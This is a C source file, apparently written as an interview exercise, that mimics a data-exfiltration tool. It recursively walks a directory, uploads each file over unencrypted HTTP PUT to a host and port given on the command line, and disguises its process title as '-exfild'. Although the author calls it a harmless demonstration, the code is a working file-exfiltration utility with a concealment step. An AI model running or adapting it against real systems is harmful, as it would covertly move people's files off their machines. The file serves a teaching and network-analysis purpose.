/************************************************************************
 * Exfil: a program that sorta kinda implements something that looks like
 * an attempt to exfiltrate data. It doesn't *really* do that: it connects
 * up to my own personal server and does a POST to an endpoint that doesn't
 * even exist. But it does all the same kinds of networking things that a
 * real exfiltration program might do.
 * 
 * A real exfiltration program probably woulnd't use TCP port 80, or even
 * port 443. And it almost certainly would use SSL to make it more difficult
 * to see what it was doing. But I want to watch interview candidates try
 * and figure out what this is doing. So I do not use SSL so they can use
 * tcpdump to see what packets are being sent over the internet.
 * 
 * Could I have written a simpler program in something other than "C"? Most
 * certainly. But I didn't. :-)
 ************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdarg.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <netdb.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>

#ifndef __APPLE__
extern void setproctitle_init(int argc, char *argv[], char *envp[]);
extern void setproctitle(const char *fmt, ...);
#endif

#define REQUEST_HEADER	0
#define HOST_HEADER	1
#define LENGTH_HEADER	3
#define MAX_PATH	1024
#define MAX_HEADER	256
#define BUFSIZE		8192

typedef union {
    struct sockaddr	sa;
    struct sockaddr_in	sa4;
    struct sockaddr_in6	sa6;
} addr_u;

typedef struct {
    addr_u	u;
    socklen_t	addrlen;
    char	*name;
} addr_t;

char		*progname;
char		*dest_host;
FILE		*sockfp;
int		sleep_interval = 5;

char		*header[] = {
    "PUT /upload HTTP/1.1\r\n",		/* Just a holding place */
    "Host: bossermate.com\r\n",		/* Just a holding place */
    "Content-type: application/binary\r\n",
    "Content-length: NNNNN",		/* Just a holding place */
    "\r\n",
    NULL
};

/************************************************************************
 ********************             ERRMSG             ********************
 ************************************************************************/
void
errmsg(char *fmt, ...)
{
    va_list	ap;
    char	temp[256];

    sprintf(temp, "%s: ", progname);
    va_start(ap, fmt);
    vsprintf(temp+strlen(temp), fmt, ap);
    va_end(ap);
    if (errno)
	perror(temp);
    else
	fprintf(stderr, "%s\n", temp);
}

/************************************************************************
 ********************             ERROUT             ********************
 ************************************************************************/
void
errout(char *fmt, ...)
{
    va_list	ap;

    va_start(ap, fmt);
    errmsg(fmt, ap);

    sleep(60);
    exit(3);
}

/************************************************************************
 ********************             USAGE              ********************
 ************************************************************************/
void usage()
{
    fprintf(stderr,
     "usage: %s -d dirname -h dst_host:dst_port [-s sleep_interval]\n",
     progname);
     fputs("sleep_interval is how long to sleep between files.  ", stderr);
     fputs("Default is 5 seconds\n", stderr);
    exit(1);
}

/************************************************************************
 ********************          LOOKUP_HOST           ********************
 ************************************************************************/
void
lookup_host(char *host, sa_family_t family, addr_t *dest, int port)
{
    struct addrinfo	hints, *ai, *result;
    struct sockaddr_in	*in4;
    struct sockaddr_in6	*in6;
    char		*name;
    int			code;

    memset(&hints, 0, sizeof(hints));
    hints.ai_flags = AI_CANONNAME;
    hints.ai_family = family;
    code = getaddrinfo(host, NULL, &hints, &result);
    if (code)
    {
	printf("after getaddrinfo, code=%d (%s)\n", code, gai_strerror(code));
	exit(3);
    }

    /*
     * Loop through the list of returned addresses, giving priority
     * to IPv6 addresses.
     */
    in4 = NULL;
    in6 = NULL;
    name = NULL;
    for (ai = result; ai; ai = ai->ai_next)
    {
	if (ai->ai_family == PF_INET6)
	{
	    in6 = (struct sockaddr_in6 *)ai->ai_addr;
	    name = ai->ai_canonname;
	    break;
	}
	if (ai->ai_family == PF_INET && !in4)
	{
	    in4 = (struct sockaddr_in *)ai->ai_addr;
	    name = ai->ai_canonname;
	}
    }

    dest->name = name;
    if (in6)
    {
	dest->u.sa6 = *in6;
	dest->u.sa6.sin6_port = htons(port);
	dest->addrlen = sizeof(struct sockaddr_in6);
	return;
    }
    if (!in4)
    {
	fprintf(stderr, "invalid destination: '%s'\n", host);
	exit(3);
    }
    dest->u.sa4 = *in4;
    dest->u.sa4.sin_port = htons(port);
    dest->addrlen = sizeof(struct sockaddr_in);
}

/************************************************************************
 ********************           URLENCODE            ********************
 ************************************************************************/
void
urlencode(char *in, char *out, int outlen)
{
    int		ch;
    static char *specials = "!\"#$%&'()*+,-./:;<=>?@[\\]_`{|}~";

    while (outlen > 1 && (ch = *in++) != '\0')
    {
	if (strchr(specials, ch) || isspace(ch))
	{
	    if (outlen < 4)
		break;
	    sprintf(out, "%%%02X", ch);
	    outlen -= 3;
	    out += 3;
	}
	else
	{
	    *out++ = ch;
	    --outlen;
	}
    }
    *out = '\0';
}


/************************************************************************
 ********************           SEND_FILE            ********************
 ************************************************************************/
int
send_file(char *fname, int striplen)
{
    int		i, fd, len;
    char	content_length[MAX_HEADER], request[MAX_HEADER];
    char	host[MAX_HEADER], buffer[BUFSIZE], encoded[MAX_PATH*2];
    struct stat	st;

    /* Get the file size for the Content-length header */
    if (stat(fname, &st) < 0)
    {
	errmsg("stat(%s) failed", fname);
	return(-1);
    }
    if ((fd = open(fname, O_RDONLY)) < 0)
    {
	errmsg("open(%s) failed", fname);
	return(-1);
    }
    
    urlencode(fname+striplen+1, encoded, sizeof(encoded));
    snprintf(request, MAX_HEADER, "PUT /upload/%s HTTP/1.1\r\n", encoded);
    header[REQUEST_HEADER] = request;
    snprintf(host, MAX_HEADER, "Host: %s\r\n", dest_host);
    header[HOST_HEADER] = host;
    snprintf(content_length, MAX_HEADER, "Content-length: %ld\r\n",
        (long)st.st_size);
    header[LENGTH_HEADER] = content_length;

    for (i = 0; header[i] != NULL; ++i)
    {
	fwrite(header[i], strlen(header[i]), 1, stdout);
	fwrite(header[i], strlen(header[i]), 1, sockfp);
    }

    while ((len = read(fd, buffer, sizeof(buffer))) > 0)
	fwrite(buffer, len, 1, sockfp);
    fflush(sockfp);
    close(fd);

    if (len < 0)
    {
	errmsg("error reading from %s", fname);
	return(-1);
    }

    if (ferror(sockfp))
    {
	errmsg("error writing to network socket");
	return(-1);
    }

    if ((len = read(fileno(sockfp), buffer, sizeof(buffer))) < 0)
    {
	errmsg("error reading from network socket");
	return(-1);
    }
    fwrite(buffer, len, 1, stdout);

    return(0);
}

/************************************************************************
 ********************       PROCESS_DIRECTORY        ********************
 ************************************************************************/
void
process_directory(int level, char *dirname)
{
    char		pathname[MAX_PATH], *name;
    DIR			*dirp;
    static int		striplen;
    struct dirent	*entp;

    if (level == 0)
	striplen = strlen(dirname);

    if ((dirp = opendir(dirname)) == NULL)
	errout("error opening directory %s", dirname);
    while ((entp = readdir(dirp)) != NULL)
    {
	name = entp->d_name;
	if (strcmp(name, ".") == 0 || strcmp(name, "..") == 0)
	    continue;
	snprintf(pathname, MAX_PATH, "%s/%s", dirname, name);
	switch(entp->d_type)
	{
	    case DT_REG:
		/*printf("%-*.*s%s\n", level*2, level*2, "", pathname);*/
		if (send_file(pathname, striplen) < 0)
		    fprintf(stderr, "%s: send_file(%s) failed", progname,
		        pathname);
		if (sleep_interval > 0)
		    sleep(sleep_interval);
		break;
	    case DT_DIR:
		/*printf("%-*.*s%s/\n", level*2, level*2, "", pathname);*/
		process_directory(level+1, pathname);
		break;
	}
    }
    closedir(dirp);
}

/************************************************************************
 ********************              MAIN              ********************
 ************************************************************************/
int
main(int argc, char *argv[], char *envp[])
{
    int		i, ch, sockfd, dstport;
    char	*chp, *dirname;
    addr_t	dest;

    progname = argv[0];
    for (i = strlen(progname) - 1; i >= 0 && progname[i] != '/'; --i);
    progname += (i + 1);

    dstport = -1;
    dest_host = dirname = NULL;
    while ((ch = getopt(argc, argv, "d:h:s:?")) != -1)
    {
	switch(ch)
	{
	    case 'd':
		dirname = strdup(optarg);
		break;
	    case 'h':
		dest_host = strdup(optarg);
		break;
	    case 's':
		sleep_interval = atoi(optarg);
		break;
	    default:
		usage();
	}
    }
    if (dest_host == NULL || dirname == NULL)
	usage();
    if ((chp = strrchr(dest_host, ':')) == NULL)
	usage();
    *chp++ = '\0';
    dstport = atoi(chp);
    if (dstport <= 0)
	usage();

    /* Try and hide the program title and args */
#ifndef __APPLE__
    setproctitle_init(argc, argv, envp);
    setproctitle("-exfild");
#endif

    memset((char *)&dest, 0, sizeof(dest));
    lookup_host(dest_host, PF_UNSPEC, &dest, dstport);

    if ((sockfd = socket(dest.u.sa.sa_family, SOCK_STREAM, 0)) < 0)
	errout("unable to create TCP socket");
    if (connect(sockfd, &dest.u.sa, dest.addrlen) < 0)
	errout("connect failed");
    sockfp = fdopen(sockfd, "r+");
    process_directory(0, dirname);
    fclose(sockfp);

    exit(0);
}
